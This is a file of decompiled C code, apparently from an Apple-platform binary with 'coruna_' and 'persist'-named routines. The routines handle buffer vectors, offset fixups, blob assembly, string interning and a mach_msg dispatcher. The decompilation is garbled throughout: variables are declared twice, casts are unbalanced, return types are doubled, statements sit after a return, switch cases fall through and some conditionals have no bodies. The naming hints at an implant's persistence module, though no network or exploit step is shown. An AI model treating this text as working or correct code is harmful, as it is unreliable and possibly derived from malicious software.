    status = coruna_vec_free(val + 6,0x10);
    if (err != 0) {
      status = err;
    }
    err = coruna_vec_free(val + 4,4);
    if (status != 0) {
      err = status;
    }
    status = coruna_vec_free(val + 8,4);
    if (err != 0) {
      status = err;
    }
    err = coruna_vec_free(val + 10,4);
    if (status != 0) {
      err = status;
    }
    status = coruna_vec_free(val + 0xc,0x18);
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    if (err != 0) {
      status = err;
    }
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[0xb] = 0;
    val[10] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    return status;
  }
  return 0xad001;
}
uint64_t
uint64_t coruna_fixup_parse_wire(uint64_t *val,uint64_t id_2,uint64_t size_3,int64_t arg,uint size,int64_t arg, uint64_t off_4,int64_t val,int flags,int64_t *n)
{
  uint64_t *ptr;
  int err;
  uint64_t u;
  char *ptr;
  int *err;
  unsigned long size;
  long *ptr;
  int status;
  unsigned long version;
  unsigned long port;
  long handle;
  long addr;
  unsigned long scratch;
  unsigned long scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  unsigned long bootargs;
  unsigned long host_info;
  unsigned long serial_buf;
  unsigned long thread_attr;
  unsigned long action;
  unsigned long host_info;
  unsigned long block_ctx;
  unsigned long stack_guard;
  unsigned long serial_buf;
  unsigned long sa_saved;
  int action;
  uint32_t sa_new;
  uint32_t path_buf;
  uint8_t tmp_buf;
  uint8_t region;
  byte block_ctx;
  uint8_t plist;
  
  if (val == (unsigned long *)0x0) {
    return 0xad001;
  }
  if (id_2 == 0) {
    return 0xad001;
  }
  if ((int)size_3 == 0) {
    return 0xad001;
  }
  if ((arg == 0) && (size != 0)) {
    return 0xad001;
  }
  if ((arg == 0) && ((int)off_4 != 0)) {
    return 0xad001;
  }
  if ((val == 0) && (flags != 0)) {
    return 0xad001;
  }
  bootargs = 0;
  bootargs = 0;
  thread_attr = 0;
  sa_saved = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  stack_guard = 0;
  serial_buf = 0;
  host_info = 0;
  action = 0;
  thread_attr = 0;
  scratch = size_3 & 0xffffffff;
  scratch = id_2;
  u = coruna_fixup_add_offsets(&action,arg,off_4,id_2,size_3);
  if (((int)u != 0) ||
     (u = coruna_fixup_add_offsets(&block_ctx,val,flags,id_2,size_3), (int)u != 0))
  coruna_fixup_ctx_clear(&scratch);
  return u;
}





uint64_t coruna_fixup_add_offsets(long *handle,unsigned long *arg,uint size,unsigned long arg,uint flags_2)
{
  uint u;
  uint64_t size;
  unsigned long version;
  unsigned long port;
  
  size = 0xad001;
  if ((handle != (long *)0x0) && ((arg != (unsigned long *)0x0 || (size == 0)))) {
    if (size != 0) {
      version = (unsigned long)size;
      do {
        port = *arg;
        if (port < arg || arg + flags_2 <= port) {
          return 0x1e007;
        }
        size = coruna_vec_grow(handle,1,4);
        if ((int)size != 0) {
          return size;
        }
        u = *(uint *)(handle + 1);
        *(uint *)(handle + 1) = u + 1;
        *(int *)(*handle + (unsigned long)u * 4) = (int)port - (int)arg;
        arg = arg + 1;
        version = version - 1;
      } while (version != 0);
    }
    size = 0;
  }
  return size;
}





uint64_t coruna_fixup_build_blob(long handle,uint64_t *val,uint *size)
{
  uint64_t u;
  unsigned long *ptr;
  int err;
  uint size;
  uint version;
  uint port;
  uint64_t tag;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  
  tag = 0xad01d;
  u = 0xad001;
  if (((handle != 0) && (val != (uint64_t *)0x0)) && (size != (uint *)0x0)) {
    bootargs = 0;
    bootargs = 0;
    thread_attr = 0;
    thread_attr = 0;
    scratch = 0;
    scratch = 0;
    size = *(uint *)(handle + 0x18);
    u = tag;
    if (size < 0xffffffd0) {
      err = 0x30;
      if (size != 0) {
        scratch = coruna_u64_pack((size), (0x30));
        if (0xffffffc8 < size) {
          return 0xad01d;
        }
        err = size + 0x30;
      }
      if (((*(uint *)(handle + 0x28) & 0xc0000000) == 0) &&
         (size = *(uint *)(handle + 0x28) * 4, size <= (-err - 8U | 7))) {
        port = err + 7U & 0xfffffff8;
        if (size != 0) {
          scratch = coruna_u64_pack((size), (err + 7U)) & 0xfffffffffffffff8;
          port = size + port;
        }
        if ((*(uint *)(handle + 0x38) & 0xf0000000) == 0) {
          version = *(uint *)(handle + 0x38) * 0x10;
          size = ~port;
          if (version <= size) {
            if (version != 0) {
              bootargs = coruna_u64_pack((version), (port));
              port = version + port;
              size = ~port;
            }
            if (((*(uint *)(handle + 0x48) & 0xc0000000) == 0) &&
               (version = *(uint *)(handle + 0x48) * 4, version <= size)) {
              if (version != 0) {
                bootargs = coruna_u64_pack((version), (port));
                port = version + port;
                size = ~port;
              }
              if (((*(uint *)(handle + 0x58) & 0xc0000000) == 0) &&
                 (version = *(uint *)(handle + 0x58) * 4, version <= size)) {
                if (version != 0) {
                  thread_attr = coruna_u64_pack((version), (port));
                  port = version + port;
                  size = ~port;
                }
                if ((((unsigned long)*(uint *)(handle + 0x68) * 0x18 & 0xffffffff00000000) == 0) &&
                   (version = *(uint *)(handle + 0x68) * 0x18, version <= size)) {
                  if (version != 0) {
                    thread_attr = coruna_u64_pack((version), (port));
                    port = version + port;
                  }
                  ptr = _calloc(1,(unsigned long)port);
                  if (ptr == (unsigned long *)0x0) {
                    u = 0xad009;
                  }
                  else {
                    ptr[1] = scratch;
                    *ptr = scratch;
                    ptr[3] = bootargs;
                    ptr[2] = bootargs;
                    ptr[5] = thread_attr;
                    ptr[4] = thread_attr;
                    if (scratch != 0) {
                      coruna_persist_trampoline_00010010((long)ptr + (scratch & 0xffffffff),
                                         *(uint64_t *)(handle + 0x10));
                    }
                    if (scratch != 0) {
                      coruna_persist_trampoline_00010010((long)ptr + (scratch & 0xffffffff),
                                         *(uint64_t *)(handle + 0x20));
                    }
                    if (bootargs != 0) {
                      coruna_persist_trampoline_00010010((long)ptr + (bootargs & 0xffffffff),
                                         *(uint64_t *)(handle + 0x30));
                    }
                    if (bootargs != 0) {
                      coruna_persist_trampoline_00010010((long)ptr + (bootargs & 0xffffffff),
                                         *(uint64_t *)(handle + 0x40));
                    }
                    if (thread_attr != 0) {
                      coruna_persist_trampoline_00010010((long)ptr + (thread_attr & 0xffffffff),
                                         *(uint64_t *)(handle + 0x50));
                    }
                    if (thread_attr != 0) {
                      coruna_persist_trampoline_00010010((long)ptr + (thread_attr & 0xffffffff),
                                         *(uint64_t *)(handle + 0x60));
                    }
                    u = 0;
                    *val = ptr;
                    *size = port;
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return u;
}





uint64_t
uint64_t coruna_fixup_apply(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4, uint64_t off_5,uint64_t off_6,uint64_t off_7,uint32_t size, uint64_t off_8,int64_t arg,int64_t arg)
{
  uint64_t u;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t host_info;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  
  if (arg == 0 || arg == 0) {
    u = 0xad001;
  }
  else {
    stack_guard = 0;
    host_info = 0;
    sa_new = 0;
    sa_saved = 0;
    serial_buf = 0;
    thread_attr = 0;
    block_ctx = 0;
    action = 0;
    bootargs = 0;
    bootargs = 0;
    host_info = 0;
    thread_attr = 0;
    scratch = 0;
    scratch = 0;
    u = coruna_fixup_parse_wire(&scratch,val,id_2,size_3,off_4,off_5,off_6,off_7,size,
                         off_8);
    if ((int)u == 0) {
      u = coruna_fixup_build_blob(&scratch,arg,arg);
      coruna_fixup_ctx_clear(&scratch);
    }
  }
  return u;
}





uint64_t coruna_vec_grow(long *handle,uint size,uint flags_2)
{
  uint u;
  uint size;
  void *ptr;
  void *buf;
  uint64_t version;
  
  version = 0xad01d;
  if (handle == (long *)0x0) {
    version = 0xad001;
  }
  else {
    u = *(uint *)(handle + 1);
    if ((unsigned long)*(uint *)((long)handle + 0xc) < (unsigned long)u + (unsigned long)size) {
      size = u + size * 10;
      if ((size != 0xffffffff) && (((unsigned long)flags_2 * (unsigned long)size & 0xffffffff00000000) == 0)) {
        ptr = _calloc(1,(unsigned long)flags_2 * (unsigned long)size & 0xffffffff);
        if (ptr == (void *)0x0) {
          version = 0xad009;
        }
        else {
          buf = (void *)*handle;
          if (buf != (void *)0x0) {
            u = u * flags_2;
            if (u != 0) {
              coruna_persist_trampoline_00010010(ptr,buf,(unsigned long)u);
              _bzero((void *)*handle,(unsigned long)u);
              buf = (void *)*handle;
            }
            _free(buf);
          }
          version = 0;
          *handle = (long)ptr;
          *(uint *)((long)handle + 0xc) = size;
        }
      }
    }
    else {
      version = 0;
    }
  }
  return version;
}





uint64_t coruna_vec_free(uint64_t *val,int flags)
{
  void *ptr;
  
  if (val != (uint64_t *)0x0) {
    ptr = (void *)*val;
    if (ptr != (void *)0x0) {
      if (*(int *)(val + 1) != 0) {
        _bzero(ptr,(unsigned long)(uint)(*(int *)(val + 1) * flags));
        ptr = (void *)*val;
      }
      _free(ptr);
    }
    *val = 0;
    val[1] = 0;
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_strpool_append(long *handle,long addr_2,unsigned long arg,uint32_t *size)
{
  uint64_t u;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (addr_2 != 0)) {
    if ((int)arg == 0) {
      u = 0;
      if (size != (uint32_t *)0x0) {
        *size = 0;
      }
    }
    else {
      u = coruna_vec_grow(handle,arg,1);
      if ((int)u == 0) {
        coruna_persist_trampoline_00010010(*handle + (unsigned long)*(uint *)(handle + 1),addr_2,arg & 0xffffffff);
        if (size != (uint32_t *)0x0) {
          *size = (int)handle[1];
        }
        u = 0;
        *(int *)(handle + 1) = (int)handle[1] + (int)arg;
      }
    }
  }
  return u;
}





uint64_t coruna_strpool_intern(int *flags,char *path,int *count_2)
{
  void (*ptr)(void);
  uint64_t u;
  size_t ls3;
  void *ptr;
  unsigned long unaff_x30;
  
  u = 0xad001;
  if (((flags != (int *)0x0) && (path != (char *)0x0)) && (count_2 != (int *)0x0)) {
    ls3 = _strlen(path);
    if ((flags[2] == 0) ||
       (ptr = _memmem(*(void **)flags,(unsigned long)(uint)flags[2],path,ls3 + 1),
       ptr == (void *)0x0)) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      u = coruna_strpool_append(flags,path,ls3 + 1,count_2);
      return u;
    }
    u = 0;
    *count_2 = (int)ptr - *flags;
  }
  return u;
}





unsigned long coruna_mach_msg_dcc0(long arg,unsigned long val,mach_msg_id_t *n,uint m,uint p,
                  mach_port_t q)

{
  uint32_t u;
  mach_msg_id_t lm2;
  mach_msg_id_t *lpm3;
  mach_msg_id_t *lpm4;
  size_t ls5;
  long base;
  uint64_t kind;
  uint64_t type_id_8;
  uint8_t *copy;
  uint type_id_14;
  void (*copy)(void);
  unsigned long type_id_9;
  unsigned long type_id_10;
  unsigned long host_info;
  mach_msg_id_t *cache_56;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint8_t cache_57[12];
  mach_port_t cache_58;
  mach_msg_size_t cache_59;
  mach_msg_id_t cache_60;
  mach_msg_id_t cache_61;
  uint8_t cache_62;
  uint8_t sa_saved;
  uint16_t sa_new;
  uint32_t path_buf;
  uint16_t tmp_buf;
  uint16_t region;
  uint32_t plist;
  uint32_t cache_63;
  int cache_64;
  uint64_t url_buf;
  uint64_t cache_65;
  uint64_t json_buf;
  uint64_t cache_66;
  uint64_t frame;
  uint64_t cache_67;
  uint64_t work;
  uint64_t cache_68;
  uint64_t cache;
  uint64_t cache_69;
  uint64_t cache_20;
  uint64_t cache_70;
  uint64_t cache_21;
  uint64_t cache_71;
  uint64_t cache_22;
  uint64_t sa_new;
  uint64_t cache_23;
  uint64_t cache_72;
  uint64_t cache_24;
  uint64_t cache_73;
  uint64_t cache_25;
  uint64_t cache_74;
  uint64_t cache_26;
  uint64_t cache_75;
  uint64_t cache_27;
  uint64_t cache_76;
  uint64_t cache_28;
  uint64_t cache_77;
  uint64_t cache_29;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_55;
  long block_ctx;
  
  block_ctx = *(long *)k_persist_stack_chk_guard_slot;
  type_id_10 = 0xad001;
  unique0x10000537 = (mach_msg_id_t *)coruna_u64_pack((cache_58), (cache_57));
  if ((arg == 0) ||
     ((n == (mach_msg_id_t *)0x0 &&
      (unique0x1000053f = (mach_msg_id_t *)coruna_u64_pack((cache_58), (cache_57)), m != 0))))
  if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
  ___stack_chk_fail();
  }
  return type_id_10;
  type_id_14 = (uint)val;
  _bzero(&host_info,0x800);
  lpm4 = (mach_msg_id_t *)coruna_u64_pack((cache_58), (cache_57));
  lpm3 = (mach_msg_id_t *)coruna_u64_pack((cache_58), (cache_57));
  if (((val & 0xfffffff7) != 0) && (p + 1 < 2))       val = 0;
      type_id_9 = 0;
      type_id_10 = 0x1e020;
      unique0x1000050f = lpm3;
  if (0xb < type_id_14) {
    type_id_9 = 0;
    val = 0;
    type_id_10 = 0x1e026;
    unique0x1000051f = (mach_msg_id_t *)coruna_u64_pack((cache_58), (cache_57));
    if (1 < q + 1) {
    cache_55 = 0;
    cache_29 = 0;
    cache_77 = 0;
    cache_31 = 0;
    cache_30 = 0;
    cache_28 = 0;
    cache_76 = 0;
    cache_27 = 0;
    cache_75 = 0;
    cache_26 = 0;
    cache_74 = 0;
    cache_25 = 0;
    cache_73 = 0;
    cache_24 = 0;
    cache_72 = 0;
    cache_23 = 0;
    sa_new = 0;
    cache_22 = 0;
    cache_71 = 0;
    cache_21 = 0;
    cache_70 = 0;
    cache_20 = 0;
    cache_69 = 0;
    cache = 0;
    cache_68 = 0;
    work = 0;
    cache_67 = 0;
    frame = 0;
    cache_66 = 0;
    json_buf = 0;
    cache_65 = 0;
    url_buf = 0;
    cache_64 = 0;
    tmp_buf = 0;
    region = 0;
    plist = 0;
    cache_62 = 0;
    sa_saved = 0;
    sa_new = 0;
    path_buf = 0;
    cache_61 = 0;
    cache_58 = 0;
    cache_59 = 0;
    cache_57 = k_persist_rodata_word_1efb0;
    cache_60 = -5;
    cache_63 = (uint32_t)type_id_10;
    cache_57 = q;
    if ((int)val != 0) {
    cache_64 = (int)val;
    ___memcpy_chk(&url_buf,&host_info,val & 0xffffffff,0x100);
    }
    if (1 < (int)type_id_9 + 1U) {
    cache_57 = cache_57 | 0x80000000;
    cache_61 = 1;
    cache_62 = (uint8_t)type_id_9;
    sa_saved = (uint8_t)(type_id_9 >> 8);
    sa_new = (uint16_t)(type_id_9 >> 0x10);
    region = 0x13;
    }
    _mach_msg((mach_msg_header_t *)cache_57,0x11,0x134,0,0,0,0);
    }
  }
  type_id_9 = val;
  type_id_10 = val;
  unique0x10000517 = (mach_msg_id_t *)coruna_u64_pack((cache_58), (cache_57));
  switch(val & 0xffffffff) {
  default:
    if (1 < q + 1) {
    cache_55 = 0;
    cache_29 = 0;
    cache_77 = 0;
    cache_31 = 0;
    cache_30 = 0;
    cache_28 = 0;
    cache_76 = 0;
    cache_27 = 0;
    cache_75 = 0;
    cache_26 = 0;
    cache_74 = 0;
    cache_25 = 0;
    cache_73 = 0;
    cache_24 = 0;
    cache_72 = 0;
    cache_23 = 0;
    sa_new = 0;
    cache_22 = 0;
    cache_71 = 0;
    cache_21 = 0;
    cache_70 = 0;
    cache_20 = 0;
    cache_69 = 0;
    cache = 0;
    cache_68 = 0;
    work = 0;
    cache_67 = 0;
    frame = 0;
    cache_66 = 0;
    json_buf = 0;
    cache_65 = 0;
    url_buf = 0;
    cache_64 = 0;
    tmp_buf = 0;
    region = 0;
    plist = 0;
    cache_62 = 0;
    sa_saved = 0;
    sa_new = 0;
    path_buf = 0;
    cache_61 = 0;
    cache_58 = 0;
    cache_59 = 0;
    cache_57 = k_persist_rodata_word_1efb0;
    cache_60 = -5;
    cache_63 = (uint32_t)type_id_10;
    cache_57 = q;
    if ((int)val != 0) {
    cache_64 = (int)val;
    ___memcpy_chk(&url_buf,&host_info,val & 0xffffffff,0x100);
    }
    if (1 < (int)type_id_9 + 1U) {
    cache_57 = cache_57 | 0x80000000;
    cache_61 = 1;
    cache_62 = (uint8_t)type_id_9;
    sa_saved = (uint8_t)(type_id_9 >> 8);
    sa_new = (uint16_t)(type_id_9 >> 0x10);
    region = 0x13;
    }
    _mach_msg((mach_msg_header_t *)cache_57,0x11,0x134,0,0,0,0);
    }
  case 1:
  case 2:
    if (m == 0x18) {
      if (p + 1 < 2) break;
      cache_62 = (uint8_t)n[5];
      cache_61 = n[4];
      unique0x00048400 = *(mach_msg_id_t **)n;
      cache_57 = p;
      cache_59 = (mach_msg_size_t)*(uint64_t *)(n + 2);
      cache_60 = (mach_msg_id_t)((unsigned long)*(uint64_t *)(n + 2) >> 0x20);
      sa_saved = 0;
      base = *(long *)(arg + 0x18);
      kind = *(uint64_t *)(arg + 0x20);
      u = 0x4000000e;
      if (type_id_14 != 1) {
        u = 0x40000012;
      }
      copy = *(void (**)(base + 0x28);
code_r0x0000df60:
      type_id_10 = (*copy)(base,kind,u,cache_57);
      (**(void (**)(*(long *)(arg + 0x18) + 0x28))
                (*(long *)(arg + 0x18),*(uint64_t *)(arg + 0x20),0xc,p);
code_r0x0000e138:
      type_id_9 = 0;
      val = 0;
    }
    else {
code_r0x0000dd4c:
      val = 0;
      type_id_9 = 0;
      type_id_10 = 0x1e020;
      unique0x1000050f = lpm3;
    }
    if (1 < q + 1) {
    cache_55 = 0;
    cache_29 = 0;
    cache_77 = 0;
    cache_31 = 0;
    cache_30 = 0;
    cache_28 = 0;
    cache_76 = 0;
    cache_27 = 0;
    cache_75 = 0;
    cache_26 = 0;
    cache_74 = 0;
    cache_25 = 0;
    cache_73 = 0;
    cache_24 = 0;
    cache_72 = 0;
    cache_23 = 0;
    sa_new = 0;
    cache_22 = 0;
    cache_71 = 0;
    cache_21 = 0;
    cache_70 = 0;
    cache_20 = 0;
    cache_69 = 0;
    cache = 0;
    cache_68 = 0;
    work = 0;
    cache_67 = 0;
    frame = 0;
    cache_66 = 0;
    json_buf = 0;
    cache_65 = 0;
    url_buf = 0;
    cache_64 = 0;
    tmp_buf = 0;
    region = 0;
    plist = 0;
    cache_62 = 0;
    sa_saved = 0;
    sa_new = 0;
    path_buf = 0;
    cache_61 = 0;
    cache_58 = 0;
    cache_59 = 0;
    cache_57 = k_persist_rodata_word_1efb0;
    cache_60 = -5;
    cache_63 = (uint32_t)type_id_10;
    cache_57 = q;
    if ((int)val != 0) {
    cache_64 = (int)val;
    ___memcpy_chk(&url_buf,&host_info,val & 0xffffffff,0x100);
    }
    if (1 < (int)type_id_9 + 1U) {
    cache_57 = cache_57 | 0x80000000;
    cache_61 = 1;
    cache_62 = (uint8_t)type_id_9;
    sa_saved = (uint8_t)(type_id_9 >> 8);
    sa_new = (uint16_t)(type_id_9 >> 0x10);
    region = 0x13;
    }
    _mach_msg((mach_msg_header_t *)cache_57,0x11,0x134,0,0,0,0);
    }
  case 3:
  case 4:
    if ((m < 5) ||
       (unique0x00023700 = n + 1,
       *(char *)((long)unique0x00023700 + (unsigned long)(m - 5)) != '\0'))       val = 0;
      type_id_9 = 0;
      type_id_10 = 0x1e020;
      unique0x1000050f = lpm3;
    if (1 < p + 1) {
      lm2 = *n;
      cache_57 = p;
      ls5 = _strlen((char *)unique0x00023700);
      cache_59 = (mach_msg_size_t)ls5;
      base = *(long *)(arg + 0x18);
      kind = *(uint64_t *)(arg + 0x20);
      copy = *(void (**)(base + 0x28);
      u = 0x40000011;
      cache_60 = lm2;
      if (type_id_14 != 3) {
        u = 0x40000010;
      }
      type_id_10 = (*copy)(base,kind,u,cache_57);
      (**(void (**)(*(long *)(arg + 0x18) + 0x28))
      (*(long *)(arg + 0x18),*(uint64_t *)(arg + 0x20),0xc,p);
    }
    break;
  case 5:
    if (m != 0)       val = 0;
      type_id_9 = 0;
      type_id_10 = 0x1e020;
      unique0x1000050f = lpm3;
    if (1 < p + 1) {
      base = *(long *)(arg + 0x18);
      kind = *(uint64_t *)(arg + 0x20);
      copy = *(void (**)(base + 0x28);
      copy = (uint8_t *)(unsigned long)p;
      type_id_8 = 0xc;
      type_id_10 = (*copy)(base,kind,type_id_8,copy);
      type_id_9 = 0;
      val = 0;
    }
    break;
  case 6:
    if (m != 0)       val = 0;
      type_id_9 = 0;
      type_id_10 = 0x1e020;
      unique0x1000050f = lpm3;
    if (1 < p + 1) {
      base = *(long *)(arg + 0x18);
      kind = *(uint64_t *)(arg + 0x20);
      copy = *(void (**)(base + 0x28);
      copy = (uint8_t *)(unsigned long)p;
      type_id_8 = 0x16;
      type_id_10 = (*copy)(base,kind,type_id_8,copy);
      type_id_9 = 0;
      val = 0;
    }
    break;
  case 7:
    if (m != 0)       val = 0;
      type_id_9 = 0;
      type_id_10 = 0x1e020;
      unique0x1000050f = lpm3;
    if (1 < p + 1) {
      base = *(long *)(arg + 0x18);
      kind = *(uint64_t *)(arg + 0x20);
      copy = *(void (**)(base + 0x28);
      copy = (uint8_t *)(unsigned long)p;
      type_id_8 = 0x1a;
      type_id_10 = (*copy)(base,kind,type_id_8,copy);
      type_id_9 = 0;
      val = 0;
    }
    break;
  case 8:
    if (m != 0)       val = 0;
      type_id_9 = 0;
      type_id_10 = 0x1e020;
      unique0x1000050f = lpm3;
    cache_57 = 0;
    cache_57 = p;
    type_id_10 = (**(void (**)(*(long *)(arg + 0x18) + 0x28))
                       (*(long *)(arg + 0x18),*(uint64_t *)(arg + 0x20),0xc0000020,
                        cache_57);
    val = 0;
    type_id_14 = cache_57;
    if ((int)type_id_10 != 0) {
      type_id_14 = 0;
    }
    type_id_9 = (unsigned long)type_id_14;
    if (1 < q + 1) {
    cache_55 = 0;
    cache_29 = 0;
    cache_77 = 0;
    cache_31 = 0;
    cache_30 = 0;
    cache_28 = 0;
    cache_76 = 0;
    cache_27 = 0;
    cache_75 = 0;
    cache_26 = 0;
    cache_74 = 0;
    cache_25 = 0;
    cache_73 = 0;
    cache_24 = 0;
    cache_72 = 0;
    cache_23 = 0;
    sa_new = 0;
    cache_22 = 0;
    cache_71 = 0;
    cache_21 = 0;
    cache_70 = 0;
    cache_20 = 0;
    cache_69 = 0;
    cache = 0;
    cache_68 = 0;
    work = 0;
    cache_67 = 0;
    frame = 0;
    cache_66 = 0;
    json_buf = 0;
    cache_65 = 0;
    url_buf = 0;
    cache_64 = 0;
    tmp_buf = 0;
    region = 0;
    plist = 0;
    cache_62 = 0;
    sa_saved = 0;
    sa_new = 0;
    path_buf = 0;
    cache_61 = 0;
    cache_58 = 0;
    cache_59 = 0;
    cache_57 = k_persist_rodata_word_1efb0;
    cache_60 = -5;
    cache_63 = (uint32_t)type_id_10;
    cache_57 = q;
    if ((int)val != 0) {
    cache_64 = (int)val;
    ___memcpy_chk(&url_buf,&host_info,val & 0xffffffff,0x100);
    }
    if (1 < (int)type_id_9 + 1U) {
    cache_57 = cache_57 | 0x80000000;
    cache_61 = 1;
    cache_62 = (uint8_t)type_id_9;
    sa_saved = (uint8_t)(type_id_9 >> 8);
    sa_new = (uint16_t)(type_id_9 >> 0x10);
    region = 0x13;
    }
    _mach_msg((mach_msg_header_t *)cache_57,0x11,0x134,0,0,0,0);
    }
  case 9:
    if (m != 0x18)       val = 0;
      type_id_9 = 0;
      type_id_10 = 0x1e020;
      unique0x1000050f = lpm3;
    if (1 < p + 1) {
      cache_62 = (uint8_t)n[5];
      cache_61 = n[4];
      cache_57 = p;
      cache_57 = (uint32_t)*(uint64_t *)n;
      cache_58 = (mach_port_t)((unsigned long)*(uint64_t *)n >> 0x20);
      cache_59 = (mach_msg_size_t)*(uint64_t *)(n + 2);
      cache_60 = (mach_msg_id_t)((unsigned long)*(uint64_t *)(n + 2) >> 0x20);
      sa_saved = 0;
      base = *(long *)(arg + 0x18);
      kind = *(uint64_t *)(arg + 0x20);
      type_id_8 = 0x40000021;
      copy = *(void (**)(base + 0x28);
      copy = cache_57;
      type_id_10 = (*copy)(base,kind,type_id_8,copy);
      type_id_9 = 0;
      val = 0;
    }
    break;
  case 10:
  case 0xb:
    if (m != 0x18)       val = 0;
      type_id_9 = 0;
      type_id_10 = 0x1e020;
      unique0x1000050f = lpm3;
    if (p + 1 < 2) break;
    cache_57 = p;
    cache_57 = (uint32_t)*(uint64_t *)n;
    cache_58 = (mach_port_t)((unsigned long)*(uint64_t *)n >> 0x20);
    cache_59 = (mach_msg_size_t)*(uint64_t *)(n + 2);
    cache_60 = (mach_msg_id_t)((unsigned long)*(uint64_t *)(n + 2) >> 0x20);
    cache_61 = coruna_cat(cache_61._1_3_,(char)n[4]);
    tmp_buf = 0;
    region = 0;
    plist = 0;
    cache_62 = 0;
    sa_saved = 0;
    sa_new = 0;
    path_buf = 0;
    u = 0xc0000023;
    if (type_id_14 != 10) {
      u = 0x40000023;
    }
    type_id_10 = (**(void (**)(*(long *)(arg + 0x18) + 0x28))
                       (*(long *)(arg + 0x18),*(uint64_t *)(arg + 0x20),u,cache_57);
    type_id_9 = 0;
    cache_56 = (mach_msg_id_t *)coruna_u64_pack((cache_58), (cache_57));
    host_info = cache_57;
    action = coruna_cat(sa_new,coruna_cat(sa_saved,coruna_u64_pack14((cache_62), (cache_61))));
    serial_buf = coruna_u64_pack((cache_60), (cache_59));
    stack_guard = coruna_u64_pack((cache_63), (plist));
    block_ctx = coruna_cat(region,coruna_cat(tmp_buf,path_buf));
    type_id_14 = 0x30;
    if ((int)type_id_10 != 0) {
      type_id_14 = 0;
    }
    val = (unsigned long)type_id_14;
    unique0x10000527 = cache_56;
    if (1 < q + 1) {
    cache_55 = 0;
    cache_29 = 0;
    cache_77 = 0;
    cache_31 = 0;
    cache_30 = 0;
    cache_28 = 0;
    cache_76 = 0;
    cache_27 = 0;
    cache_75 = 0;
    cache_26 = 0;
    cache_74 = 0;
    cache_25 = 0;
    cache_73 = 0;
    cache_24 = 0;
    cache_72 = 0;
    cache_23 = 0;
    sa_new = 0;
    cache_22 = 0;
    cache_71 = 0;
    cache_21 = 0;
    cache_70 = 0;
    cache_20 = 0;
    cache_69 = 0;
    cache = 0;
    cache_68 = 0;
    work = 0;
    cache_67 = 0;
    frame = 0;
    cache_66 = 0;
    json_buf = 0;
    cache_65 = 0;
    url_buf = 0;
    cache_64 = 0;
    tmp_buf = 0;
    region = 0;
    plist = 0;
    cache_62 = 0;
    sa_saved = 0;
    sa_new = 0;
    path_buf = 0;
    cache_61 = 0;
    cache_58 = 0;
    cache_59 = 0;
    cache_57 = k_persist_rodata_word_1efb0;
    cache_60 = -5;
    cache_63 = (uint32_t)type_id_10;
    cache_57 = q;
    if ((int)val != 0) {
    cache_64 = (int)val;
    ___memcpy_chk(&url_buf,&host_info,val & 0xffffffff,0x100);
    }
    if (1 < (int)type_id_9 + 1U) {
    cache_57 = cache_57 | 0x80000000;
    cache_61 = 1;
    cache_62 = (uint8_t)type_id_9;
    sa_saved = (uint8_t)(type_id_9 >> 8);
    sa_new = (uint16_t)(type_id_9 >> 0x10);
    region = 0x13;
    }
    _mach_msg((mach_msg_header_t *)cache_57,0x11,0x134,0,0,0,0);
    }
  }
  type_id_9 = 0;
  val = 0;
  type_id_10 = 0xad001;
  unique0x1000052f = lpm4;
exit_ok:
  if (1 < q + 1) {
    cache_55 = 0;
    cache_29 = 0;
    cache_77 = 0;
    cache_31 = 0;
    cache_30 = 0;
    cache_28 = 0;
    cache_76 = 0;
    cache_27 = 0;
    cache_75 = 0;
    cache_26 = 0;
    cache_74 = 0;
    cache_25 = 0;
    cache_73 = 0;
    cache_24 = 0;
    cache_72 = 0;
    cache_23 = 0;
    sa_new = 0;
    cache_22 = 0;
    cache_71 = 0;
    cache_21 = 0;
    cache_70 = 0;
    cache_20 = 0;
    cache_69 = 0;
    cache = 0;
    cache_68 = 0;
    work = 0;
    cache_67 = 0;
    frame = 0;
    cache_66 = 0;
    json_buf = 0;
    cache_65 = 0;
    url_buf = 0;
    cache_64 = 0;
    tmp_buf = 0;
    region = 0;
    plist = 0;
    cache_62 = 0;
    sa_saved = 0;
    sa_new = 0;
    path_buf = 0;
    cache_61 = 0;
    cache_58 = 0;
    cache_59 = 0;
    cache_57 = k_persist_rodata_word_1efb0;
    cache_60 = -5;
    cache_63 = (uint32_t)type_id_10;
    cache_57 = q;
    if ((int)val != 0) {
      cache_64 = (int)val;
      ___memcpy_chk(&url_buf,&host_info,val & 0xffffffff,0x100);
    }
    if (1 < (int)type_id_9 + 1U) {
      cache_57 = cache_57 | 0x80000000;
      cache_61 = 1;
      cache_62 = (uint8_t)type_id_9;
      sa_saved = (uint8_t)(type_id_9 >> 8);
      sa_new = (uint16_t)(type_id_9 >> 0x10);
      region = 0x13;
    }
    _mach_msg((mach_msg_header_t *)cache_57,0x11,0x134,0,0,0,0);
  }
again:
  if (*(long *)k_persist_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail();
  }
  return type_id_10;
}





unsigned long coruna_mach_port_deallocate(mach_port_name_t *arg)

{
  uint8_t *data;
  kern_return_t lk2;
  uint version;
  unsigned long type_id;
  uint port;
  
  if (arg == (mach_port_name_t *)0x0) {
    type_id = 0xad001;
  }
  else {
    type_id = coruna_pthread_join();
    data = k_persist_mach_task_self_slot;
    if (1 < *arg + 1) {
